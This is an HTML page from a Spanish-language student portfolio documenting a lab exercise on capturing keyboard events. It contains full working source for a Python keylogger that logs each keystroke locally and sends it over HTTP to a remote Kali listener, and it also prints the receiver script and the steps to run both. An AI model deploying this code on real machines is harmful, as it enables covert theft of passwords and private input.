@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 03 — No presiones Esc... todavía</title>
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        .info-box { text-align:center; border:1px dashed var(--g); padding:15px; margin-bottom:0; }
+        .info-box p { margin:4px 0; }
+        .risk-badge { display:inline-block; border:2px solid var(--g); color:var(--g); font-weight:bold; padding:6px 20px; letter-spacing:3px; margin-top:10px; animation:blink-border 1.8s ease-in-out infinite; }
+        @keyframes blink-border { 0%,100%{box-shadow:0 0 6px var(--g);} 50%{box-shadow:0 0 20px var(--g),inset 0 0 10px rgba(179,136,255,.15);} }
+
+        .stat-row { display:flex; flex-wrap:wrap; gap:12px; justify-content:center; margin:16px 0; }
+        .stat-card { background:rgba(179,136,255,.05); border:1px solid var(--bdr); border-top:2px solid var(--g); padding:14px 20px; text-align:center; min-width:110px; }
+        .stat-card .sv { font-size:1.8rem; font-weight:900; color:var(--g); line-height:1; }
+        .stat-card .sv.blue { color:var(--ap); }
+        .stat-card .sl { font-size:.65rem; color:var(--gdim); letter-spacing:.1em; margin-top:3px; }
+
+        .obj-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(230px,1fr)); gap:12px; margin-top:14px; }
+        .obj-card { border:1px solid var(--bdr); padding:14px 16px; background:rgba(179,136,255,.03); }
+        .obj-card i { color:var(--ap); margin-right:6px; }
+
+        .req-list { list-style:none; margin-top:12px; }
+        .req-list li { border-left:2px solid var(--g); padding:10px 14px; margin-bottom:10px; background:rgba(179,136,255,.03); }
+        .req-list li b { color:var(--g); }
+        .req-list code { color:var(--ap); background:rgba(59,157,255,.08); padding:1px 6px; border-radius:2px; }
+
+        .code-window { border:1px solid var(--bdr); border-radius:3px; overflow:hidden; margin:14px 0; }
+        .code-bar { background:rgba(0,0,0,.4); padding:8px 14px; font-size:.7rem; color:var(--gdim); border-bottom:1px solid var(--bdr); display:flex; align-items:center; gap:8px; }
+        .code-bar i { color:var(--ap); }
+        .code-body { padding:0; }
+        .code-body pre { margin:0; padding:16px; overflow-x:auto; font-size:.76rem; line-height:1.65; color:var(--txt); }
+
+        .step-flow { display:flex; flex-wrap:wrap; gap:0; margin-top:14px; }
+        .step-box { flex:1; min-width:170px; border:1px solid var(--bdr); border-right:none; padding:14px 12px; position:relative; background:rgba(179,136,255,.02); }
+        .step-box:last-child { border-right:1px solid var(--bdr); }
+        .step-box::after { content:'▶'; position:absolute; right:-10px; top:50%; transform:translateY(-50%); color:var(--g); font-size:.65rem; z-index:2; }
+        .step-box:last-child::after { display:none; }
+        .step-box .sn { font-size:.6rem; color:var(--ap); letter-spacing:.15em; margin-bottom:5px; }
+        .step-box .st { font-weight:bold; color:#fff; font-size:.8rem; margin-bottom:4px; }
+        .step-box .sd { font-size:.68rem; color:var(--gdim); line-height:1.5; }
+
+        .evidence-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(280px,1fr)); gap:16px; margin-top:14px; }
+        .evidence-card { border:1px solid var(--bdr); overflow:hidden; }
+        .evidence-card img { width:100%; display:block; }
+        .evidence-caption { padding:10px 14px; font-size:.72rem; color:var(--gdim); border-top:1px solid var(--bdr); background:rgba(179,136,255,.03); }
+        .evidence-caption b { color:var(--g); }
+
+        .warn-box { border:1px solid var(--denied); background:rgba(255,95,122,.05); padding:16px 18px; margin-top:10px; }
+        .warn-box h3 { color:var(--denied); font-size:.85rem; margin-bottom:8px; }
+        .warn-box p { font-size:.78rem; color:var(--txt); opacity:.9; line-height:1.7; }
+
+        .rubric-table { width:100%; border-collapse:collapse; font-size:.76rem; margin-top:10px; }
+        .rubric-table th { color:var(--g); text-align:left; padding:8px 10px; border-bottom:1px solid var(--bdr); background:rgba(179,136,255,.06); font-size:.68rem; letter-spacing:.05em; }
+        .rubric-table td { padding:8px 10px; border-bottom:1px solid rgba(179,136,255,.08); color:var(--txt); opacity:.9; vertical-align:top; }
+        .rubric-table tr:hover td { background:rgba(179,136,255,.02); }
+
+        .concl-box { border:1px solid var(--bdr); border-top:2px solid var(--g); padding:16px 18px; margin-top:14px; background:rgba(179,136,255,.02); }
+        .concl-box h3 { color:var(--g); font-size:.8rem; letter-spacing:1px; margin-bottom:10px; }
+        .concl-box p { font-size:.82rem; color:var(--txt); line-height:1.9; margin-bottom:8px; }
+    </style>
+</head>
+<body>
+
+<canvas id="matrix-left"></canvas>
+<canvas id="matrix-right"></canvas>
+
+<main>
+    <a href="../actividades.html" class="back-btn"><i class="fas fa-arrow-left"></i> Volver a Actividades</a>
+
+    <!-- ══════════════════ ENCABEZADO ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-keyboard"></i> Actividad 03 — No presiones Esc... todavía</h2>
+        <div class="info-box">
+            <p><i class="fas fa-code"></i> CNO IV — Programación WAP</p>
+            <p><i class="fas fa-user-graduate"></i> Magdalena Yesenia Tristán Rivera — 174702</p>
+            <p><i class="fas fa-users"></i> Grupo: T37A</p>
+            <p><i class="fas fa-calendar"></i> 24 / 08 / 2026</p>
+            <span class="risk-badge">CAPTURA DE EVENTOS DE TECLADO</span>
+        </div>
+        <div class="stat-row">
+            <div class="stat-card"><div class="sv">01:30</div><div class="sl">Duración estimada</div></div>
+            <div class="stat-card"><div class="sv blue">3</div><div class="sl">Requisitos técnicos</div></div>
+            <div class="stat-card"><div class="sv">2</div><div class="sl">Equipos involucrados</div></div>
+            <div class="stat-card"><div class="sv blue">Kali</div><div class="sl">Receptor remoto</div></div>
+        </div>
+    </section>
+
+    <!-- ══════════════════ OBJETIVOS ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-bullseye"></i> Objetivo General</h2>
+        <p>Implementar y documentar, en un entorno de laboratorio controlado, un programa basado en <strong>event hooks y callbacks</strong> que permita registrar eventos de teclado, asociarlos temporalmente y transmitir telemetría hacia un receptor de laboratorio, con el fin de comprender técnicamente una técnica de captura de entrada y reconocer sus implicaciones dentro de la ciberseguridad.</p>
+
+        <h2 style="margin-top:22px;"><i class="fas fa-list-check"></i> Objetivos Específicos</h2>
+        <div class="obj-grid">
+            <div class="obj-card"><i class="fas fa-save"></i>Modificar el código base para incorporar persistencia del registro, asociación temporal y envío controlado de eventos.</div>
+            <div class="obj-card"><i class="fas fa-vial"></i>Comprobar y explicar el funcionamiento del programa mediante pruebas, capturas de pantalla y análisis del código desarrollado.</div>
+            <div class="obj-card"><i class="fas fa-book-open"></i>Documentar y publicar la actividad en el portafolio digital, integrando el informe, el código fuente y la página HTML correspondiente.</div>
+        </div>
+    </section>
+
+    <!-- ══════════════════ REQUISITOS ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-clipboard-list"></i> Requisitos Técnicos</h2>
+        <ul class="req-list">
+            <li><b>1. Persistencia del registro</b><br>El programa almacena cada evento generado en un archivo local (<code>keylog.txt</code>) durante toda la ejecución, sin sobreescribir los registros anteriores.</li>
+            <li><b>2. Asociación temporal</b><br>Cada evento incluye una marca de fecha y hora con milisegundos, siguiendo el formato <code>2026-08-18 12:15:04.215 | PRESS | evento_001</code>, para poder identificar cuándo ocurrió cada evento y cuánto tiempo transcurrió entre ellos.</li>
+            <li><b>3. Envío de información a un equipo con Kali Linux</b><br>El programa transmite la telemetría generada hacia un receptor HTTP corriendo en Kali Linux, en la ruta recomendada <code>Parcial1 &gt; Actividades &gt; actividad3.html</code> del portafolio.</li>
+        </ul>
+    </section>
+
+    <!-- ══════════════════ CÓDIGO CLIENTE ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-laptop-code"></i> Código — Cliente (Windows / equipo emisor)</h2>
+        <p>Versión ampliada del código visto en clase. Incorpora persistencia en archivo local, marca de tiempo con milisegundos y envío HTTP opcional hacia el receptor en Kali Linux.</p>
+
+        <div class="code-window">
+            <div class="code-bar"><i class="fab fa-python"></i> keylogger_cliente.py</div>
+            <div class="code-body"><pre><code>import datetime
+import requests
+from pynput.keyboard import Key, Listener
+
+# Configuración
+LOG_FILE = "keylog.txt"
+KALI_SERVER_URL = "http://192.168.1.50:8000"  # IP del equipo con Kali Linux
+
+def guardar_evento(tipo_evento, tecla):
+    """Genera la marca de tiempo y guarda el registro localmente."""
+    # Formato requerido: 2026-08-18 12:15:04.215 | PRESS | evento_001
+    ahora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
+    registro = f"{ahora} | {tipo_evento} | {tecla}\n"
+
+    # 1. Persistencia local
+    with open(LOG_FILE, "a", encoding="utf-8") as f:
+        f.write(registro)
+
+    # 3. Envío opcional/periódico de telemetría a Kali Linux
+    enviar_reporte(registro)
+
+def enviar_reporte(datos):
+    """Envía el registro al servidor receptor en Kali Linux."""
+    try:
+        requests.post(KALI_SERVER_URL, data={"log": datos}, timeout=2)
+    except Exception:
+        pass  # Evita interrumpir la captura si el servidor remoto está inalcanzable
+
+def on_press(key):
+    try:
+        tecla = f"'{key.char}'"
+        print(f"Tecla alfanumerica presionada: {key.char}")
+    except AttributeError:
+        tecla = str(key)
+        print(f"Tecla Especial presionada: {key}")
+
+    # 2. Asociación temporal + Persistencia
+    guardar_evento("PRESS", tecla)
+
+def on_release(key):
+    tecla = str(key) if hasattr(key, 'name') else getattr(key, 'char', str(key))
+    print(f"key released: {key}")
+
+    guardar_evento("RELEASE", tecla)
+
+    # Salir del programa al presionar ESC
+    if key == Key.esc:
+        return False
+
+# Inicio del listener
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()</code></pre></div>
+        </div>
+    </section>
+
+    <!-- ══════════════════ CÓDIGO RECEPTOR ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-server"></i> Código — Receptor (Kali Linux)</h2>
+        <p>Servidor HTTP mínimo que escucha peticiones <code>POST</code>, imprime el evento recibido en la terminal de Kali y lo guarda en un archivo de registro remoto.</p>
+
+        <div class="code-window">
+            <div class="code-bar"><i class="fab fa-python"></i> receptor.py</div>
+            <div class="code-body"><pre><code>from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+
+        # Muestra el evento recibido en la terminal de Kali
+        print(f"[+] Evento recibido:\n{post_data}")
+
+        # Guarda el registro en Kali
+        with open("registros_remotos.txt", "a") as f:
+            f.write(post_data + "\n")
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+# Escucha en todas las interfaces en el puerto 8000
+server = HTTPServer(('0.0.0.0', 8000), RequestHandler)
+print("[*] Servidor escuchando en puerto 8000 en Kali Linux...")
+server.serve_forever()</code></pre></div>
+        </div>
+
+        <h2 style="margin-top:22px;"><i class="fas fa-terminal"></i> Pasos de ejecución en Kali Linux</h2>
+        <div class="step-flow">
+            <div class="step-box"><div class="sn">PASO 01</div><div class="st">Crear el archivo</div><div class="sd"><code>nano receptor.py</code> y pegar el código del servidor.</div></div>
+            <div class="step-box"><div class="sn">PASO 02</div><div class="st">Guardar y salir</div><div class="sd">Ctrl+O para guardar, Enter para confirmar, Ctrl+X para salir de nano.</div></div>
+            <div class="step-box"><div class="sn">PASO 03</div><div class="st">Ejecutar el servidor</div><div class="sd"><code>python3 receptor.py</code> — queda escuchando en el puerto 8000.</div></div>
+            <div class="step-box"><div class="sn">PASO 04</div><div class="st">Ejecutar el cliente</div><div class="sd">Correr <code>keylogger_cliente.py</code> en el equipo Windows con la IP de Kali configurada.</div></div>
+        </div>
+    </section>
+
+    <!-- ══════════════════ EVIDENCIAS ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-camera"></i> Evidencia de Ejecución</h2>
+        <p>Pruebas realizadas en dos equipos: captura de eventos de teclado en el equipo cliente y recepción de la telemetría en la terminal del servidor Kali Linux.</p>
+        <div class="evidence-grid">
+            <div class="evidence-card">
+                <img src="img/act3-evidencia1.png" alt="Prueba del listener de teclado en VS Code">
+                <div class="evidence-caption"><b>Equipo cliente</b> — Listener de <code>pynput</code> detectando teclas presionadas y liberadas en consola.</div>
+            </div>
+            <div class="evidence-card">
+                <img src="img/act3-evidencia2.png" alt="Servidor receptor.py corriendo en Kali Linux">
+                <div class="evidence-caption"><b>Kali Linux</b> — <code>receptor.py</code> escuchando en el puerto 8000 y recibiendo el mensaje enviado desde el cliente.</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ══════════════════ AUTOEVALUACIÓN ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-clipboard-check"></i> Criterios de Evaluación</h2>
+        <table class="rubric-table">
+            <tr><th style="width:20%">Criterio</th><th>Cómo se cumple en esta entrega</th></tr>
+            <tr><td>Implementación técnica</td><td>El programa registra los eventos en <code>keylog.txt</code> y conserva la información después de finalizar la ejecución.</td></tr>
+            <tr><td>Asociación temporal</td><td>Cada evento incluye fecha y hora con milisegundos, permitiendo correlacionar el orden y el tiempo entre eventos.</td></tr>
+            <tr><td>Envío de información</td><td>El cliente transmite cada registro por HTTP hacia <code>receptor.py</code> en Kali Linux, con manejo de errores si el servidor no está disponible.</td></tr>
+            <tr><td>Informe y evidencias</td><td>Esta página documenta el código, su funcionamiento y las pruebas realizadas, con capturas de ambos equipos.</td></tr>
+            <tr><td>Portafolio digital</td><td>La actividad queda publicada dentro de Parcial 1, con navegación funcional de regreso a Actividades.</td></tr>
+        </table>
+    </section>
+
+    <!-- ══════════════════ CONSIDERACIONES ÉTICAS ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-shield-alt"></i> Consideraciones Éticas y de Uso</h2>
+        <div class="warn-box">
+            <h3>⚠ USO EXCLUSIVO DE LABORATORIO CONTROLADO</h3>
+            <p>Este ejercicio se realizó únicamente en equipos propios, dentro de un entorno académico controlado y con fines de aprendizaje sobre técnicas de captura de entrada. La instalación de este tipo de software en un equipo de terceros sin su consentimiento explícito constituye una violación a la privacidad y puede configurar un delito informático conforme al Código Penal Federal. El conocimiento técnico adquirido en esta actividad debe emplearse exclusivamente para fines defensivos, de auditoría autorizada o educativos.</p>
+        </div>
+    </section>
+
+    <!-- ══════════════════ CONCLUSIÓN ══════════════════ -->
+    <section class="window">
+        <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+        <h2><i class="fas fa-flag-checkered"></i> Conclusión</h2>
+        <div class="concl-box">
+            <h3>// APRENDIZAJES</h3>
+            <p>Esta actividad permitió comprender cómo funcionan los <strong>event hooks y callbacks</strong> a nivel de sistema operativo para capturar eventos de teclado, y cómo estructurar un programa que además de registrar localmente la información, la transmite hacia un receptor remoto mediante peticiones HTTP.</p>
+            <p>Implementar la <strong>persistencia</strong> y la <strong>asociación temporal</strong> mostró la importancia de estructurar correctamente los registros para poder auditarlos después: sin una marca de tiempo precisa sería imposible reconstruir el orden real de los eventos.</p>
+            <p>Ver el flujo completo —desde que se presiona una tecla en el equipo cliente hasta que el dato aparece en la terminal de Kali Linux— ayudó a dimensionar técnicamente el alcance de este tipo de herramientas y la responsabilidad ética que implica manejarlas.</p>
+        </div>
+    </section>
+
+</main>
+
+<footer>
+    <p>Magdalena Yesenia Tristán Rivera – 174702</p>
+</footer>
+
+<script src="../matrix.js"></script>
+</body>
+</html>
